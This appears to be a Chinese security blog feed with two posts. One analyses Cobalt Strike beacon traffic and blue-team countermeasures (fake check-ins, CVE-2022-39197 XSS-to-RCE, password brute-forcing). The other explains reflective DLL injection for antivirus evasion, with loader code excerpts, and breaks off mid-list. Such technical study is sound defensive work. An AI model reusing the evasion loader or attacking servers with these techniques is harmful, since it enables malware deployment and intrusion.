        <content type="html"><![CDATA[<h1 id="Cobaltstrike上线过程与蓝队反制"><a href="#Cobaltstrike上线过程与蓝队反制" class="headerlink" title="Cobaltstrike上线过程与蓝队反制"></a>Cobaltstrike上线过程与蓝队反制</h1><p>CS的流量通道有很多，如http、https、dns、TCP、SMB等，但我们这里主要研究beacon通过http通道的CS上线过程</p><a id="more"></a><p>所以我们创建监听器的时候payload选择Beacon HTTP</p><h2 id="Cobaltstrike上线过程"><a href="#Cobaltstrike上线过程" class="headerlink" title="Cobaltstrike上线过程"></a>Cobaltstrike上线过程</h2><p>这里用了别人的一张图，能很清晰的看清楚流量交互的大致流程<br><img src="https://s2.loli.net/2022/11/28/Zqp2hx3YzyTNbB7.png"><br>我们对其中的每一步来具体分析</p><ol><li>通过各种方式将样本(分阶段的)或者恶意代码发送到受害端<br>这个比较好理解，就是第一步将木马放到受害者主机上</li><li>运行样本或执行恶意代码<br>这步也很好理解，受害者运行我们所生成的木马</li><li>请求特定算法获取到URI<br>这里其实出现了第一个问题，什么是特定算法，这里就想到了很多安全公司，能用他们的引擎来查询到相关CS，MSF的特征码，特征流量相关信息，来进行拦截。那么这里的特定算法也是如此<br><img src="https://s2.loli.net/2022/11/28/bAcrXi4qwWhjIPe.png"><br>主要是这里的<code>checksum8</code>方法，其主要实现了转ascii对应十进制，然后求和256取余，最后余数和92，93来对比，92是x86,93是x64，而所谓的特征流量相关信息，也就是对应的uri:<code>YPbR</code>(这里对应的uri每次都不一样，但一般都是4个字符)<br><img src="https://s2.loli.net/2022/11/28/qGIkZORXv3rT1jC.png" alt="image.png"></li><li>校验URI，返回完整的stager beacon<br>这里就对应第三步，受害者请求了<code>YPbR</code>的对应URI，然后cs向其发送完整的beacon</li><li>完整的stager beacon文件<br>我们将其导出对象，HTTP<br><img src="https://s2.loli.net/2022/11/28/1v5bIJ84CcZX9iO.png"></li><li>解密stage beacon文件获取到公钥以及相关server的信息<br><img src="https://s2.loli.net/2022/11/28/GALoNKkdOWMHZCi.png"><br>将我们导出的对象<code>YPbR</code>,进行解密，这里有一个写好的<a href="https://github.com/minhangxiaohui/CSthing">脚本</a><br>将其解密，可以得到如下结果<br><img src="https://s2.loli.net/2022/11/28/suVM6E17mUWjpkL.png"><br>在其中可以看到很多关键信息，也是很多安全大厂扫描器扫描之后，能得到的内容</li></ol><ul><li>在<code>0x0001 payload type</code> 记录了攻击载荷类型<code>windows-beacon_http-reverse_http</code></li><li>在<code>0x0002 port</code>记录了端口<code>80</code></li><li>在<code>0x0003 sleeptime</code>记录了心跳间隔<code>60000</code></li><li>在<code>0x0004 maxgetsize</code>记录了最大数据长度<code>1048579</code></li><li>在<code>0x0005 jitter</code>记录了帧的偏差<code>0</code></li><li>在<code>0x0007 publickey</code>记录了公钥<code>30819f300d06092a864886f70d010101050003818d0030818902818100a738cde75f1fbb1c18646c377e03016b162b12ba72bdf7dc36b4cd2e4e9bae12205a95c26170bf908105ad7fa4bbccfa798632261bed9870f975f20794e1fe499523d71f08a56cae0315bfde3d6c8a16386b03b7a6551aa1336d50325a3500db27d78ad8fd13b6a73b9fb7c3fb4d7a088e323f07618656ecd83595fa5f823613020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></li><li>在<code>0x0008 server,get-uri</code>记录了获取的uri<code>192.168.152.129,/g.pixel</code></li><li>在<code>0x0009 useragent</code>记录了useragent<code>&#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MATMJS)</code></li><li>在<code>0x000a post-uri</code>记录了执行命令的uri<code>/submit.php</code></li><li>在<code>0x000b Malleable_C2_Instructions</code>记录了所执行的命令<code>\x00\x00\x00\x04</code></li></ul><ol start="7"><li><p>使用公钥加密相关受害端的信息和自己伪随机生成的一个对称加密的密钥生成Cookies字段，通过HTTP请求放在心跳包里面传输<br><img src="https://s2.loli.net/2022/11/28/dR6bJjk7M8UNVGt.png"><br>可以看到，在心跳连接中，cookie承载的就是对应的加密内容，而这里用到的是非对称加密，而去获取对应的私钥，则需要去CSclient的源码里面找，其关键代码如下<br><img src="https://s2.loli.net/2022/11/28/eXmzcC9lLoqJ827.png"><br>这样我们就可以到CSserver的服务器看一下，找到这个文件，并反序列化得到对应的公私钥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ga0wei.text;  <br>​  <br><span class="hljs-keyword">import</span> sleep.runtime.Scalar;  <br>​  <br><span class="hljs-keyword">import</span> javax.crypto.Cipher;  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br><span class="hljs-keyword">import</span> java.security.KeyPair;  <br><span class="hljs-keyword">import</span> java.security.PrivateKey;  <br><span class="hljs-keyword">import</span> java.security.PublicKey;  <br><span class="hljs-keyword">import</span> java.util.Base64;  <br>​  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Getkey</span> </span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String\[\] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;  <br>        PrivateKey privateKey;  <br>        Cipher cipher;  <br>        <span class="hljs-comment">//获取密钥对象   </span><br>        ObjectInputStream var2 \= <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;keys&quot;</span>));  <br>        Scalar var3 \= (Scalar)var2.readObject();  <br>        var2.close();  <br>        KeyPair keyPair1 \= (KeyPair) var3.objectValue();  <br>          <br>        <span class="hljs-comment">//初始化cipher对象，准备解密  </span><br>        privateKey \=keyPair1.getPrivate();  <br>        cipher \=Cipher.getInstance(<span class="hljs-string">&quot;RSA/ECB/PKCS1Padding&quot;</span>);  <br>        cipher.init(<span class="hljs-number">2</span>,privateKey);  <br>          <br>        <span class="hljs-comment">//元数据  </span><br>        String ciphertext \= <span class="hljs-string">&quot;WTbGz2y0K24UJovEX+proVDR+jInn7C/H8JwIa3+DCdm+qkSbquSRU2/n/ss8dMUHogaPFIn/N+xaAOW/gmfvu4HfVNF8Kk/XsRN35By03QWKIbhVbNGyZOBwCYGWs3f9XjUa8rqbiHbmRnRppbEpVv/+pvlVqYUh53bFQP9O7E=&quot;</span>;  <br>        <span class="hljs-keyword">byte</span>\[\] cipherbyte \= Base64.getDecoder().decode(ciphertext);  <br>          <br>        <span class="hljs-comment">//解密  </span><br>        <span class="hljs-keyword">byte</span>\[\] text \= cipher.doFinal(cipherbyte);  <br>​  <br>        <span class="hljs-comment">//输出文件 和控制台  </span><br>        <span class="hljs-keyword">try</span>(FileOutputStream fos \= <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;Text&quot;</span>))) &#123;  <br>            System.out.println(<span class="hljs-string">&quot;解密成功&quot;</span>);  <br>            fos.write(text);  <br>            System.out.println(<span class="hljs-keyword">new</span> String(text));  <br>                    System.out.println(<span class="hljs-string">&quot;privatekey :&quot;</span>+<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(keyPair1.getPrivate().getEncoded())));  <br>                    System.out.println(<span class="hljs-string">&quot;publickey : &quot;</span>+<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(keyPair1.getPublic().getEncoded())));  <br>        &#125;  <br>    &#125;  <br>&#125; <br></code></pre></td></tr></table></figure><p>而我们现在得到的公钥与我们之前解密beacon所获取的0x0007 publickey公钥相同<br>将私钥编码，传入RSA私钥对，根据CS里面元数据的结构体，将解密后的内容进行整理<br>解密之后的结果，就可以看到受害机器信息，主机名、用户名、样本名</p></li><li><p>使用私钥解密cookies字段的内容，获取到对称密钥和相关受害段信息并判断aggressor端是否有要执行的相关任务<br><img src="https://s2.loli.net/2022/11/28/WdSkMfa7E2vxrtm.png"><br><img src="https://s2.loli.net/2022/11/28/la7L68op12D5zQA.png"></p></li><li><p>有任务：在相应题里面发送使用对称密钥AES加密待执行命令的内容，没有任务：响应空<br><img src="https://s2.loli.net/2022/11/28/vsVUzCSWkDaOmFt.png"><br>可以看到在一个心跳包的来回中，响应流量会带有类似乱码的信息，而这其实是C2在发送任务给受害主机<br>由于这两部分流量都是由对应的对称密钥加密得，所以我们用之前获取到的解密元数据中的rawkey，即可进行解密<br><img src="https://s2.loli.net/2022/11/28/qr7s1vLfRhgptGd.png"><br>接着我们进行相应的解密，就可以得到其对应的直接通信的明文流量<br>!(<a href="https://s2.loli.net/2022/11/28/TbL1qgaHumWd8F3.png">https://s2.loli.net/2022/11/28/TbL1qgaHumWd8F3.png</a>)</p></li><li><p>使用生成的对称密钥,AES解密响应体，执行对应任务</p></li><li><p>通过Post请求里面的请求体来将回显请求体内容为使用对称密钥AES加密执行结果<br><img src="https://s2.loli.net/2022/11/28/jSPgDMqTYksWIao.png"></p></li></ol><h2 id="Cobaltstrike蓝队反制"><a href="#Cobaltstrike蓝队反制" class="headerlink" title="Cobaltstrike蓝队反制"></a>Cobaltstrike蓝队反制</h2><p>上面我们分析完了Cobaltstrike的上线过程，接下来就是蓝队如何利用CS这个上线的过程来进行反制，主要是以下四种方式</p><h3 id="伪造流量批量上线（欺骗防御）"><a href="#伪造流量批量上线（欺骗防御）" class="headerlink" title="伪造流量批量上线（欺骗防御）"></a>伪造流量批量上线（欺骗防御）</h3><p>伪造流量批量上线这个手段是属于技战法里面的欺骗防御，通过伪造上线心跳流量，发送至攻击者的c2，使攻击者的c2同时上线的大量终端<br>通常有两种常见场景：<br>第一种是，发现攻击者对我们单位在进行精准钓鱼，那么我们可以通过这个欺骗防御，来混淆攻击者的视听，让攻击者的c2server上线大量机器，但是攻击者却执行不了任何命令<br>第二种是，发现我们内部已经存在被钓鱼上线的机器，那么此时我们通过这种欺骗防御就是来拖延攻击者，使攻击者难辨真假，从而争取一些排查处置的时间</p><p>而对于伪造上线流量，就是构造心跳流量，也就是伪造cookie字段，那我们就根据上面所抓的心跳包，构造相应的流量，而其构造结构主要是</p><blockquote><p>标志头（4）+Size（4）+Rawkey(16)+字体（4）+beacon ID(4)+ 进程ID（4）+port(2)+内核（4）+09 +失陷IP + 09 + 主机名+ 09 + 用户名+09+进程名<br>CS的监听器判断是否是同一个心跳是通过beacon ID这个属性来判断的，只要这个属性不一样就会被识别成不同的上线流量，接下来，我们拿到公钥，对伪造的明文流量进行加密，就可以生成cookie字段了，这里作者也实现了批量上线的<a href="https://github.com/minhangxiaohui/cobaltstrikefakeup">工具</a></p></blockquote><p>可以看到，伪造的心跳流量已经批量上线了<br><img src="https://s2.loli.net/2022/11/28/BvWrZEtlM5VdcfJ.png"></p><h3 id="通过漏洞反制"><a href="#通过漏洞反制" class="headerlink" title="通过漏洞反制"></a>通过漏洞反制</h3><p>对于CS的CVE，有CVE-2021-36798、CVE-2022-23317等，但这里我们用到的是CVE-2022-39197<br>其主要是XSS<br>元数据格式：标志头（4）+Size（4）+Rawkey(16)+字体（4）+beacon ID(4)+ 进程ID（4）+port(2)+内核（4）+09 +失陷IP + 09 + 主机名+ 09 + <code>用户名</code>+09+进程名<br>而XSS的注入点就在于这个用户名<br>在这里可以注入一些东西，但需要注意的是，我们需要将其他字段的长度缩短，因为最终被加密时，所对应的长度是有限制的，因为通过模n同余计算时，结果都是要受限制与n的长度<br>这里XSS倒是不难，但在漂亮鼠师傅的文章中，实现了从XSS到RCE<br>其过程主要是通过swing里面引用html渲染的时候，如果我们引用的相应标签的时候，会通过javax.swing.text.html.HTMLEditorKit类中create方法来创建对应的元素，当我们传入的标签是一个HTML.Tag.OBJECT类型的标签的时候会调用new ObjectView()来生成对应的元素，这里面解析object标签的时候会根据其Classid来解析，在这个过程中会通过Class.forname加载对应类然后通过newinstance获取classid传入类的实例，并且当该类继承了Component时，会调用setParameters方法，在这个方法里面一定情况下会反射调用对应类的对应参数的set方法（这里的条件是：该方法的传入参数只有一个且是String类型），并且该set方法传入的参数也是我们可控的，从而这里就出现了一个漏洞利用的可能</p><p>这种反制类似于内网中的蜜罐，让攻击者打进来，然后反向获取攻击者的一些信息或者权限来反制</p><h3 id="爆破server口令"><a href="#爆破server口令" class="headerlink" title="爆破server口令"></a>爆破server口令</h3><p>这种方式是当我们返现一个vpn运行了cs server的时候，我们通过口令字典对server端实现爆破，从而登录server，获取攻击者的相关信息<br>但这种方式会遇到一些问题</p><ol><li>攻防中，不容易找到真实的c2，大多被隐藏，例如：域前置技术、云函数转发等</li><li>使用cs的红队，自身出现弱口令的概率并不高</li><li>攻防中，团队使用的cs，会出现各种改版过的登录协议，难以攻击</li><li>cs自身做过相应的处理，对这种爆破做了一定的防御措施</li></ol><h3 id="旁路反制"><a href="#旁路反制" class="headerlink" title="旁路反制"></a>旁路反制</h3><p>这个就比较泛泛而谈了，好比渗透测试或者是rt打项目的时候，如果目标找不到利用点进去，就可以从旁站看看对吧，所以这种旁路反制亦是这样，我们发现一个c2上运行着cobaltstrike server了，然后上述的其他反制手段都行不通，这时我们就可以看看，这个c2上是不是还有其他的服务，我们对其端口进行扫描，获取相关信息，从其他服务的缺陷来实现反制，举个例子，很对rt或者攻击者在遇到weblogic、fastjson、log4j2等jndi漏洞的时候，要进行漏洞利用就得起rmi或者ldap，server，自己手动起是很麻烦的，所以网上会有很多的自动化工具，这对于攻击者来说是一个不错的选择。那么如果我们发现网上这类工具的一些rce了，就可以通过这个来反制。</p><p>前段时间参加某次演习活动的时候，通过一些手段拿到了一个c2，对c2进行扫描后发现，其相关端口搭建的服务是nps的web控制端服务，所以后续就可以通过爆破该服务来实现反制，虽然后续爆破无果，后续的话正好当时nps是爆出来了个鉴权的漏洞，通过这个漏洞我们实现反制，拿到了攻击者的一些信息，以及其掌握的相关权限。</p><p>总而言之，旁路反制的这个概念是非常广泛的，手段也是层出不朽的。在近些年的攻防的博弈中，防守方的防守体系已经逐渐体系成熟化，并且也逐渐开启了一些反制的号角，这里面蜜罐是最具有里程碑意义的。笔者认为一方攻一方守并不是所谓的攻防，攻防也者，应该是来回交战，攻中带防（攻击者要能掌握反反制手段），防中带攻（防守者要能抓住攻击者露出的马脚，进行反制），就和古代武侠比武一样。</p><hr><p>参考文章：<br><a href="https://forum.butian.net/share/1861">https://forum.butian.net/share/1861</a><br><a href="https://forum.butian.net/share/1975">https://forum.butian.net/share/1975</a><br><a href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ">https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射型DLL注入</title>
      <link href="2022/11/15/%E5%8F%8D%E5%B0%84%E5%9E%8BDLL%E6%B3%A8%E5%85%A5/"/>
      <url>2022/11/15/%E5%8F%8D%E5%B0%84%E5%9E%8BDLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="反射型DLL注入"><a href="#反射型DLL注入" class="headerlink" title="反射型DLL注入"></a>反射型DLL注入</h1><h2 id="常规DLL注入"><a href="#常规DLL注入" class="headerlink" title="常规DLL注入"></a>常规DLL注入</h2><p>磁盘读取dll到数组 -&gt; 将payload数组写入目标内存 -&gt; 在目标内存中找到LoadLibraryW -&gt; 通过CreateRemoteThread调用LoadLibraryW函数，参数为dll在内存中的地址</p><a id="more"></a><p>但这样的操作会多次触碰到AV的报毒点，所以我们引入了反射型DLL注入技术</p><h2 id="反射型DLL实现思路"><a href="#反射型DLL实现思路" class="headerlink" title="反射型DLL实现思路"></a>反射型DLL实现思路</h2><ol><li>有A线程向B线程写入dll</li><li>调用B线程的embedded bootstrapper code</li><li>通过bootstrapper shellcode调用dll的导出函数reflective loader</li></ol><p>reflective loader实际上是一个自己实现的LoadLibraryW函数，从内存中找到我们写入的dll并修复使其成为可以被正常使用的pe文件，最后调用DLLmain实现我们的恶意功能</p><p>但随着AV的进步，这种远程进程、线程注入的方式，也是难以bypass的，而且我们不需要bootstrapper shellcode这个部分，所以我们可以直接在加载部分算出reflective loader在内存中的地址，直接调用</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p><a href="https://github.com/Allevon412/ReflectiveDLL_Sektor7">ReflectiveDLL_Sektor7</a></p><p>来看其中的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">AESDecrypt((<span class="hljs-keyword">char</span>*)payload, payload_len, (<span class="hljs-keyword">char</span>*)key, <span class="hljs-keyword">sizeof</span>(key));<br></code></pre></td></tr></table></figure><p>解密shellcode，这里使用的是AES解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">DWORD <span class="hljs-title">GetReflectiveLoaderOffset</span><span class="hljs-params">(VOID* lpReflectiveDllBuffer)</span></span><br><span class="hljs-function"></span>&#123;<br>UINT_PTR uiBaseAddress = <span class="hljs-number">0</span>;<br>UINT_PTR uiExportDir = <span class="hljs-number">0</span>;<br>UINT_PTR uiNameArray = <span class="hljs-number">0</span>;<br>UINT_PTR uiAddressArray = <span class="hljs-number">0</span>;<br>UINT_PTR uiNameOrdinals = <span class="hljs-number">0</span>;<br>DWORD dwCounter = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WIN_X64</span><br>DWORD dwCompiledArch = <span class="hljs-number">2</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-comment">// This will catch Win32 and WinRT.</span><br>DWORD dwCompiledArch = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br>uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;<br><br><span class="hljs-comment">// get the File Offset of the modules NT Header</span><br>uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;<br><br><span class="hljs-comment">// currenlty we can only process a PE file which is the same type as the one this fuction has  </span><br><span class="hljs-comment">// been compiled as, due to various offset in the PE structures being defined at compile time.</span><br><span class="hljs-keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == <span class="hljs-number">0x010B</span>) <span class="hljs-comment">// PE32</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwCompiledArch != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == <span class="hljs-number">0x020B</span>) <span class="hljs-comment">// PE64</span><br>&#123;<br><span class="hljs-keyword">if</span> (dwCompiledArch != <span class="hljs-number">2</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// uiNameArray = the address of the modules export directory entry</span><br>uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<br><br><span class="hljs-comment">// get the File Offset of the export directory</span><br>uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of name pointers</span><br>uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of addresses</span><br>uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress);<br><br><span class="hljs-comment">// get the File Offset for the array of name ordinals</span><br>uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress);<br><br><span class="hljs-comment">// get a counter for the number of exported functions...</span><br>dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames;<br><br><span class="hljs-comment">// loop through all the exported functions to find the ReflectiveLoader</span><br><span class="hljs-keyword">while</span> (dwCounter--)<br>&#123;<br><span class="hljs-keyword">char</span>* cpExportedFunctionName = (<span class="hljs-keyword">char</span>*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(cpExportedFunctionName, REFLDR_NAME) != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-comment">// get the File Offset for the array of addresses</span><br>uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress);<br><br><span class="hljs-comment">// use the functions name ordinal as an index into the array of name pointers</span><br>uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="hljs-keyword">sizeof</span>(DWORD));<br><br><span class="hljs-comment">// return the File Offset to the ReflectiveLoader() functions code...</span><br><span class="hljs-keyword">return</span> Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);<br>&#125;<br><span class="hljs-comment">// get the next exported function name</span><br>uiNameArray += <span class="hljs-keyword">sizeof</span>(DWORD);<br><br><span class="hljs-comment">// get the next exported function name ordinal</span><br>uiNameOrdinals += <span class="hljs-keyword">sizeof</span>(WORD);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>计算出reflective loader的偏移<br>其中在<code>while (dwCounter--)</code>循环中遍历导出表，根据函数名找到<code>bootloader</code>函数，来获得函数的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">th = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)((ULONG_PTR)exec_mem + RefLdrOffset), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>创建线程调用<code>ReflectLoader</code>函数</p><h3 id="dll处理"><a href="#dll处理" class="headerlink" title="dll处理"></a>dll处理</h3><p>在<code>ReflectiveLoader</code>中，主要做了如下工作</p><ol><li>解析加载DLL所需kernel32.dll WINAPI的地址(例如VirtualAlloc, LoadLibraryA等),通过hash遍历内存搜索<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (usCounter &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">// compute the hash values for this function name</span><br>dwHashValue = hash((<span class="hljs-keyword">char</span>*)(uiBaseAddress + DEREF_32(uiNameArray)));<br><br><span class="hljs-comment">// if we have found a function we want we get its virtual address</span><br><span class="hljs-keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH)<br>&#123;<br><span class="hljs-comment">// get the VA for the array of addresses</span><br>uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions);<br><br><span class="hljs-comment">// use this functions name ordinal as an index into the array of name pointers</span><br>uiAddressArray += (DEREF_16(uiNameOrdinals) * <span class="hljs-keyword">sizeof</span>(DWORD));<br><br><span class="hljs-comment">// store this functions VA</span><br><span class="hljs-keyword">if</span> (dwHashValue == LOADLIBRARYA_HASH)<br>pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwHashValue == GETPROCADDRESS_HASH)<br>pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwHashValue == VIRTUALALLOC_HASH)<br>pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));<br><br><span class="hljs-comment">// decrement our counter</span><br>usCounter--;<br>&#125;<br><br><span class="hljs-comment">// get the next exported function name</span><br>uiNameArray += <span class="hljs-keyword">sizeof</span>(DWORD);<br><br><span class="hljs-comment">// get the next exported function name ordinal</span><br>uiNameOrdinals += <span class="hljs-keyword">sizeof</span>(WORD);<br>&#125;<br></code></pre></td></tr></table></figure></li><li>将dll与其相对应的部分写入内存<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (uiValueA--)<br>*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;<br><br><span class="hljs-comment">// STEP 3: load in all of our sections...</span><br><br><span class="hljs-comment">// uiValueA = the VA of the first section</span><br>uiValueA = ((ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.SizeOfOptionalHeader);<br><br><span class="hljs-comment">// itterate through all sections, loading them into memory.</span><br>uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;<br></code></pre></td></tr></table></figure></li><li>建立DLL导入表，以便DLL可以调用ntdll.dll和kernel32.dll 